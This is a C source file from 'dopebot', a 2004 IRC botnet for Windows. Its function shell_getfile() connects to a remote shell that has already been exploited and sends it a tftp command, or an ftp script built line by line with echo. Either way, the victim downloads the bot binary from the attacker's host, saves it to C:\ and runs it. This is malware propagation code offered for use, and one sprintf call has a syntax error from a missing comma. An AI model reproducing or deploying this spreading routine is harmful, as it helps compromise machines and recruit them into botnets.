/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SCANNER
#include "bot.h"

//Shell Get File
bool shell_getfile(SOCKET bsock, char *szIP, int iPort)
{
	char szRecvBuff[BIGBUF], szSendBuff[IRCBUF];
	SOCKET sock;
	struct sockaddr_in sockinfo;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Sending command to remote exploited shell, shell_getfile()...\n");
#endif
	
//	if (WSAStartup(MAKEWORD(2,2), &wsadata) != 0) return FALSE;
		sockinfo.sin_addr.s_addr = inet_addr(szIP);
		sockinfo.sin_port = htons(iPort);		
		sockinfo.sin_family = AF_INET;
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(sock, (struct sockaddr *)&sockinfo, sizeof(sockinfo)) == SOCKET_ERROR) 
	{
			closesocket(sock);
//			WSACleanup();
			return FALSE;
	}
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);

#ifndef NO_TFTPD
		sprintf(szSendBuff, "tftp -i %s get %s C:\\%s\r\n", get_ip(bsock), filename, filename);
	goto cont;
#endif

#ifndef NO_FTPD
		sprintf(szSendBuff, "echo open %s %i > o&echo user %s %s >> o &echo get %s C:\\%s >> o &echo quit >> o &ftp -n -s:o &%s\r\n", get_ip(bsock), ftpdport, ftpduser, ftpdpass filename, filename, filename);	
#endif
	
cont:
		Sleep(500);
	if (send(sock, szSendBuff, strlen(szSendBuff), 0) == SOCKET_ERROR) return FALSE;
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);
		sprintf(szSendBuff, "C:\\%s\r\n", filename);
		Sleep(500);
	if (send(sock, szSendBuff, strlen(szSendBuff), 0) == SOCKET_ERROR) return FALSE;
		recv(sock, szRecvBuff, sizeof(szRecvBuff), 0);
		closesocket(sock);
//		WSACleanup();
		return TRUE;
}
#endif